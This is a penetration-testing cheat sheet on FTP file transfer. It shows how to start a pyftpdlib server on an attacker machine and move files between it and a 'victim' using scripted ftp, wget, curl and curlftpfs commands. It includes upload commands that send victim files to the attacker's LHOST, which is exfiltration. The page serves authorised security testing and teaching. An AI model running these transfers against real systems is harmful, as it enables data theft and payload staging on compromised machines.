# FTP Transfer Files

## Method 1 (recommended)

We open an FTP server on our machine:

{% hint style="danger" %}
Remember to open the server in the same directory where we want them to be saved or where we have the files to be uploaded.
{% endhint %}

```bash
# No authentication:
python3 -m pyftpdlib -p 2121
# With authentication:
python3 -m pyftpdlib -p 2121 --user=pentester --password=p4ssw0rd -w
```

Then, on the Windows or Linux victim machine, if we can use FTP, we can upload or download a file:

### Download files (Victim machine → Attacking machine)

{% tabs %}
{% tab title="Linux" %}
```bash
ftp
open <LHOST> 2121
pentester
p4ssw0rd
put <PATH>\<FILE>
bye
```
{% endtab %}

{% tab title="Windows" %}
```shell
echo open <LHOST> 2121 > ftp.txt
echo USER pentester p4ssw0rd >> ftp.txt
echo binary >> ftp.txt
echo put <PATH>\<FILE> >> ftp.txt
echo bye >> ftp.txt
# Then we execute:
ftp -v -n -s:ftp.txt
```
{% endtab %}
{% endtabs %}

### Upload files (Attacker machine → Victim machine)

{% tabs %}
{% tab title="Linux" %}
```bash
ftp
open <LHOST> 2121
pentester
p4ssw0rd
get <FILE>
bye
```
{% endtab %}

{% tab title="Windows" %}
```shell
echo open <LHOST> 2121 > ftp.txt
echo USER pentester p4ssw0rd >> ftp.txt
echo binary >> ftp.txt
echo lcd <Path seguro> >> ftp.txt # Path example: C:\Windows\Temp
echo get <FILE> >> ftp.txt
echo bye >> ftp.txt
# Then we execute:
ftp -v -n -s:ftp.txt
```
{% endtab %}
{% endtabs %}

## Method 2 (Only download)

```bash
# Basics:
wget 'ftp://<USER>:<PASS>@<IP>/<FILENAME>' # Download file.
wget -r 'ftp://<USER>:<PASS>@<IP>/<DIRECTORY>/' # Download recursively from a directory.
wget 'ftp://<USER>:<PASS>@<IP>/<DIRECTORY>/*' # Specify the directory and download everything from there (not recursive).
# Download all:
wget -m ftp://<USER>:<PASS>@<IP>
wget -r --no-passive --no-parent ftp://<USER>:<PASS>@<IP>
wget -m --no-passive ftp://<USER>:<PASS>@<IP>
```

## Method 3 (Only upload)

```bash
# List directories and/or files on the FTP server:
curl -s 'ftp://<USERNAME>:<PASSWORD>@<IP>/' -v -P 21
curl -s 'ftp://<USERNAME>:<PASSWORD>@<IP>/<DIRECTORY>/' -v -P 21
curl -s -v -P - 'ftp://<USERNAME>:<PASSWORD>@<IP>/'
# Upload files:
curl -s -T <FILENAME> 'ftp://<USERNAME>:<PASSWORD>@<IP>/' -v -P 21
curl -s -T <FILENAME> 'ftp://<USERNAME>:<PASSWORD>@<IP>/' -v -P -
```

## Method 4 (curlftpfs)

```bash
mkdir /mnt/ftp && cd /mnt/ftp
curlftpfs <USERNAME>:<PASSWORD>@<IP> /mnt/ftp # Mount the FTP server to /mnt/ftp
cd /mnt/ftp
# Done. We will be able to browse by FTP on our machine.
umount /mnt/ftp # To unmount the resource.
```
